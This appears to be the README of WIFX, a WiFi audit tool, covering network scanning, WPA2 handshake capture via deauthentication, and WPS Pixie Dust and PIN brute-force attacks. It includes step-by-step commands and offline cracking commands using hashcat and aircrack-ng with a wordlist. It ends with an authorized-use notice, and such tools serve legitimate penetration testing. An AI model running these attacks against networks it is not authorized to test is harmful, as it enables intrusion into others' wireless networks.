# WIFX 

> WiFi Recon & Audit — wireless network scanner, WPA2 handshake capture and WPS vulnerability assessment.

![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=flat-square&logo=python&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Kali-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square)

---

## Overview

WIFX covers the full wireless assessment workflow — scan nearby networks and audit their security configuration, capture WPA2 handshakes for offline cracking, and test for WPS vulnerabilities (Pixie Dust and PIN brute force). Requires a wireless adapter that supports monitor mode.

---

## Modules

| Module | Description |
|---|---|
| `wifi/scan` | Scan nearby networks — SSID, BSSID, channel, signal, encryption type, WPS status |
| `wifi/handshake` | WPA2 handshake capture — deauth + airodump-ng, outputs .cap file ready for hashcat |
| `wifi/wps` | WPS audit — Pixie Dust attack and PIN brute force via reaver or bully |

---

## Features

- **Multi-tool support** — auto-detects iw, iwlist, nmcli, or airodump-ng and uses whichever is available
- **Security rating** — classifies each network as OPEN, WEP (CRITICAL), WPA (HIGH), WPA2/WPA3 (OK)
- **WPS detection** — flags networks with WPS enabled as MEDIUM risk
- **Signal strength bar** — visual signal indicator per network
- **Monitor mode toggle** — `monitor <iface> on|off` command built into the shell
- **Handshake verification** — aircrack-ng confirms handshake capture and prints hashcat/john commands
- **Pixie Dust + PIN** — supports both WPS attack methods via reaver or bully

---

## Requirements

| Tool | Purpose | Install |
|---|---|---|
| `iw` or `iwlist` or `nmcli` | WiFi scanning | `apt install iw wireless-tools network-manager` |
| `aircrack-ng suite` | Handshake capture, WPS audit | `apt install aircrack-ng` |
| `reaver` or `bully` | WPS attacks | `apt install reaver` or `apt install bully` |

```bash
# Full install (Kali)
sudo apt install iw aircrack-ng reaver
```

A wireless adapter supporting **monitor mode** is required for handshake capture and WPS attacks.

---

## Installation

```bash
git clone https://github.com/NeiveZ/WIFX.git
cd WIFX
chmod +x wifx.sh
./wifx.sh
```

---

## Usage

```
wifx > ifaces                     # List wireless interfaces
wifx > monitor wlan0 on           # Enable monitor mode
wifx > use <module>
wifx > set <OPTION> <value>
wifx > run
```

### Core commands

```
use <module>            Load a module
set <OPTION> <value>    Set option
run                     Execute module
ifaces                  List wireless interfaces
monitor <iface> on|off  Toggle monitor mode
show modules            List modules
show findings           Audit findings
report [txt|json|html]  Export report
```

---

## Examples

**Scan nearby networks:**
```
wifx > use wifi/scan
wifx (wifi/scan) > set INTERFACE wlan0
wifx (wifi/scan) > set TIMEOUT 15
wifx (wifi/scan) > run
```

**Scan with monitor mode enabled automatically:**
```
wifx (wifi/scan) > set MONITOR true
wifx (wifi/scan) > run
```

**Capture WPA2 handshake:**
```
# Step 1: Scan to find target BSSID and channel
wifx > use wifi/scan
wifx (wifi/scan) > set INTERFACE wlan0
wifx (wifi/scan) > run

# Step 2: Enable monitor mode
wifx > monitor wlan0 on

# Step 3: Capture handshake
wifx > use wifi/handshake
wifx (wifi/handshake) > set INTERFACE wlan0mon
wifx (wifi/handshake) > set BSSID AA:BB:CC:DD:EE:FF
wifx (wifi/handshake) > set CHANNEL 6
wifx (wifi/handshake) > set SSID TargetNetwork
wifx (wifi/handshake) > set DEAUTH 5
wifx (wifi/handshake) > set TIMEOUT 60
wifx (wifi/handshake) > run
```

**WPS Pixie Dust attack:**
```
wifx > use wifi/wps
wifx (wifi/wps) > set INTERFACE wlan0mon
wifx (wifi/wps) > set BSSID AA:BB:CC:DD:EE:FF
wifx (wifi/wps) > set CHANNEL 6
wifx (wifi/wps) > set METHOD pixie
wifx (wifi/wps) > run
```

**WPS PIN brute force:**
```
wifx (wifi/wps) > set METHOD pin
wifx (wifi/wps) > set TIMEOUT 3600
wifx (wifi/wps) > run
```

---

## Post-Capture: Cracking the Handshake

After a successful capture, WIFX prints the exact commands to crack offline:

```bash
# Convert to hashcat format
hcxpcapngtool -o target.hc22000 captures/wifx_TargetNetwork-01.cap

# Crack with hashcat (WPA2 = mode 22000)
hashcat -m 22000 target.hc22000 /usr/share/wordlists/rockyou.txt

# Or crack directly with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b AA:BB:CC:DD:EE:FF captures/wifx_TargetNetwork-01.cap
```

---

## Output

```
wifx (wifi/scan) > run

[*] Found 8 network(s):

  CRITICAL OPEN_COFFEE          AA:BB:CC:11:22:33  ch:1    ████░ -65dBm [WPS]
  HIGH     OldRouter            DD:EE:FF:44:55:66  ch:6    ███░░ -72dBm
  GOOD     HomeNetwork_5G       11:22:33:44:55:66  ch:36   █████ -48dBm
  GOOD     Corp-WPA2            AA:BB:CC:DD:EE:FF  ch:11   ████░ -60dBm [WPS]
  STRONG   NextGen_WPA3         FF:EE:DD:CC:BB:AA  ch:6    ██░░░ -80dBm

Security Summary:
  OPEN      : 1 network(s)
  WPA       : 1 network(s)
  WPA2      : 2 network(s)
  WPA3      : 1 network(s)
```

---

## Repository Structure

```
WIFX/
├── wifx.py               # Interactive shell
├── wifx.sh               # Launcher
├── modules/
│   ├── wifi_scan.py      # Network scanner (iw/iwlist/nmcli/airodump)
│   ├── handshake.py      # Handshake capture + WPS audit
│   └── report_gen.py     # Report generator
├── utils/
│   ├── colors.py
│   └── session.py
├── captures/             # .cap files saved here
└── reports/              # Generated reports
```

---

## Legal

For use only on wireless networks you own or have explicit written authorization to test.
Unauthorized WiFi testing is illegal in most jurisdictions.
